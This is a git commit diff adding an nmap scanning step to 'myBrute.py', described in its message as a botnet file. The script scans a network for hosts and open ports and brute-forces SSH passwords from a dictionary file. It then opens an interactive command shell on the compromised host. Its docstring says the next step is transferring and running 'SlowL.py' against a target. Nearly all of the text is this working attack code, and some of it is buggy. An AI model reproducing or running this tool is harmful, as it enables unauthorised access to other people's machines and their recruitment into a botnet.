e94863cff367f05eb128520e881b9878087575c6
swapnasheel <swar.1318@gmail.com>
2017-12-04 02:02:11 -0800

    Added nmap method in the Botnet file

--- myBrute.py
+++ myBrute.py
@@ -1,8 +1,47 @@
+'''
 
+This script will do nmap scanning for hosts and open ports
+Then will give you an option to attack which host from the avaliable hosts
+Once host is selected, brute force attack will be done to get access of the others system
+Then the script shall transfer SlowL.py file 
+Then execute the file with target IP address
+
+'''
+
+
+import nmap
 from pexpect import pxssh
 import time
 import sys
 
+
+## Scan network for avaliable hosts and open ports
+
+def nmap_scan(network):
+
+    print("Scanning for avaliable hosts in the network..")
+
+    nm = nmap.PortScanner()
+
+    nm.scan(network, '20-1024')
+
+    for host in nm.all_hosts():
+        print("-----------------------------------------------------")
+        print("Hosts: %s (%s)" %(host, nm[host].hostname()))
+        print("State: %s" % nm[host].state())
+
+    for proto in nm[host].all_protocols():
+        print("---------------------------------")
+        print("Protocol: %s" %proto)
+
+        open_ports = nm[host][proto].keys()
+        open_ports.sort()
+
+        for port in open_ports:
+            print("port: %s\t state : %s" %(port, nm[host][proto][port]['state']))
+
+
+# SSH and connect to the desired host
 
 def connect(host, user, password):
     fails =0
@@ -30,41 +69,47 @@ def connect(host, user, password):
         return None
 
 
-def main():
+## Simple method to get console inputs
+def get_input(msg):
 
-    host = sys.argv[1]
-    user = sys.argv[2]
-    dt = sys.argv[3]
+    sys.stdout.write(msg)
+    sys.stdout.flush()
+    return sys.stdin.readline()
+
+
+
+def Main():
+
+    network = sys.argv[1]
+    dt = sys.argv[2]
+    nmap_scan(network)
+
+    host = get_input("Select IP address you want as an agent: ")
+    print("You have selected agent as %s " %host)
+
+    user = get_input("Enter the username of the agent: ")
 
     if dt:
         with open(dt, 'r') as infile:
             for line in infile:
                 password = line.strip('\r\n')
                 print 'Testing -> ' + str(password)
-                con = connect(host, user, password)
-                if con:
+                conn = connect(host, user, password)
+                if conn:
                     print '[SSH connected, Issue commands Q or q for quiting!]'
                     command = raw_input('>')
                     while command.lower != 'q':
-                        con.sendline(command)
-                        con.prompt()
-                        print con.before
+                        conn.sendline(command)
+                        conn.prompt()
+                        print conn.before
                         command = raw_input('>')
     else:
         print "No dict found. Error"
         exit(0)
 
+
+
 if __name__ == '__main__':
-    main()
-
-
-
-
-
-
-
-
-
-
+    Main()
 
 
